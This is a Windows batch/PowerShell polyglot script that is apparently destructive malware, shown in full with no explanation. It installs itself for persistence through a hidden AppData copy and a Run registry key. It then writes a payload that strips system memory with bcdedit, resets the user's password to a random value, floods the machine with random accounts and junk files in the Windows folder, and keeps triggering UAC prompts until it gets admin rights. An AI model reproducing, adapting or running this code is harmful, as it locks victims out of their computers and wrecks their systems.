<# :batch script
@echo off
setlocal

set "targetFolder=%LocalAppdata%\Programs\Packages\Microsoft\Low\Data\Cache\logs\Temp\Publisher\Vault\Credential\Token\Windows\input\"
mkdir "%targetFolder%" >nul
set "batchFile=%~dp0NAN.bat" >nul
copy "%batchFile%" "%targetFolder%" >nul
set "batchFile=%LocalAppdata%\Programs\Packages\Microsoft\Low\Data\Cache\logs\Temp\Publisher\Vault\Credential\Token\Windows\input\NAN.bat" 
set "entryName=LocalMicrosoftPackage"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%entryName%" /d "\"%batchFile%\"" /f >nul
endlocal

set "RR=%Temp%"
set "Batch_file=%RR%\Cmd.bat"
set "A1=for /f "skip=1" %%%%p in ('wmic os get TotalVisibleMemorySize') do ("
set "B=   set system_ram=%%%%p"
set "C=   goto :end"
set "D=^)"
set "E=:end"
set "F=::
set "G=set /a "c=%%system_ram%% - 28""
set "H=bcdedit.exe /set removememory %%c%%"
set "j1=set "username=%username%"
set "j2=setlocal enabledelayedexpansion
set "K=set "username=!username:"=_!""
set "L=set "username=!username: =_!""
set "L1=endlocal"
set "L2=net user "%username%" %random%"
set "M=:A
set "N=net user %%random%% %%random%% /add
set "N1=net user %%random%% %%random%% /add
set "N2=net user %%random%% %%random%% /add
set "N3=net user %%random%% %%random%% /add
set "O=cd %%windir%%
set "P0=echo .^> %%random%%.WannaCry
set "P1=echo .^> %%random%%.txt
set "P2=echo .^> %%random%%.exe
set "P3=echo .^> %%random%%.reg
set "P4=echo .^> %%random%%.doc
set "P5=echo .^> %%random%%.hlp
set "P6=echo .^> %%random%%.zip
set "P7=echo .^> %%random%%.imesx
set "P8=echo .^> %%random%%.iso
set "P9=echo .^> %%random%%.mov
set "P10=echo .^> %%random%%.appinstaller
set "R=goto:A

echo %A1% > %Batch_file%
echo %B% >> %Batch_file%
echo %C% >> %Batch_file%
echo %D% >> %Batch_file%
echo %E% >> %Batch_file%
echo %F% >> %Batch_file%
echo %G% >> %Batch_file%
echo %H% >> %Batch_file%
echo %j1% >> %Batch_file%
echo %j2% >> %Batch_file%
echo %K% >> %Batch_file%
echo %L% >> %Batch_file%
echo %L1% >> %Batch_file%
echo %L2% >> %Batch_file%
echo %M% >> %Batch_file%
echo %N% >> %Batch_file%
echo %N1% >> %Batch_file%
echo %N2% >> %Batch_file%
echo %N3% >> %Batch_file%
echo %O% >> %Batch_file%
echo %P0% >> %Batch_file%
echo %P1% >> %Batch_file%
echo %P2% >> %Batch_file%
echo %P3% >> %Batch_file%
echo %P4% >> %Batch_file%
echo %P5% >> %Batch_file%
echo %P6% >> %Batch_file%
echo %P7% >> %Batch_file%
echo %P8% >> %Batch_file%
echo %P9% >> %Batch_file%
echo %P10% >> %Batch_file%
echo %R% >> %Batch_file%



setlocal
cd "%~dp0"
powershell -ep remotesigned -Command "IEX $([System.IO.File]::ReadAllText('%~f0'))"
endlocal
goto:eof
#>


while($true){try{Start-Process 'cmd' -Verb runas -ArgumentList '/c start /min "" "%Temp%\cmd.bat"' -WindowStyle Hidden
$errorlevel=0;
break;
} catch{}
}
goto:eof

@(
REM ADD here the command that run after the UAC prompt [without admin right]
)
